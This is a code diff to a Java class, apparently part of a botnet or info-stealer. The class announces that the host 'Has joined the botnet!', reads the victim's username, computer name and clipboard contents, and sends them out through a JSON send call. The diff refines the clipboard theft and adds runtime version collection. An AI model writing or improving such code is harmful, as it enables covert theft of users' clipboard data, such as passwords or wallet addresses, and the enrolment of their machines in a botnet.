@@ -17,10 +17,11 @@ public final class GeneralInformation implements JSONObject {
         content += "Hostname: " + System.getProperty("user.name") + "@" + System.getenv("COMPUTERNAME") + " Has joined the botnet!" + "\\n";
         try {
             String clipboard = String.valueOf(Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor));
-            if (content.length() <= 400 && clipboard.length() <= 1600) content += "Clipboard: " + clipboard + "\\n";
+            if (content.length() <= 500 && clipboard.length() <= 1500 && Toolkit.getDefaultToolkit().getSystemClipboard().isDataFlavorAvailable(DataFlavor.stringFlavor)) content += "Clipboard: " + clipboard + "\\n";
         } catch (Exception ignored) {
         }
-        content += "Java Version: " + System.getProperty("java.version");
+        content += "Java Version: " + System.getProperty("java.version") + "\\n";
+        content += "Java Runtime Version: " + System.getProperty("java.runtime.version");
 
         JSONRegexHandler.send(new JSONBuilder().value("content", content).build());
     }
